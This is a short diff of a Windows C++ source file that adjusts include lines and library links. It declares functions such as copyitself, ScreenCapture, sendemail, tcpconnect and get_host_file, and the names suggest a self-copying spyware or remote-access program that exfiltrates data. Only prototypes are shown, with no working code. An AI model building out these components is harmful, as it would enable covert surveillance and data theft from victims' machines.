@@ -18,15 +18,16 @@
 #include <tchar.h>
 #include <list>
 #include <string>
-#include <windows.h>
-#include <Urlmon.h>
-#include <fstream>
-// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
+//#include "FTPClient.h"
+//#include "FTPFileStatus.h"
+#include "FTPListParse.h"
+//#include "BlockingSocket.h"
+
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
 
-#pragma comment(lib, "d3d9.lib")  // link to DirectX 9 library
+#pragma comment(lib, "d3d9.lib")
 using namespace std;
 
 using namespace std;
@@ -35,5 +36,5 @@ void sendemail(list<string> &l);
 void copy();
 void copyitself(const char *s);
 int ScreenCapture(const char* fname);
-void tcpconnect(char *addr, char* port);
+void tcpconnect(const char *addr,const char* port);
 bool get_host_file();
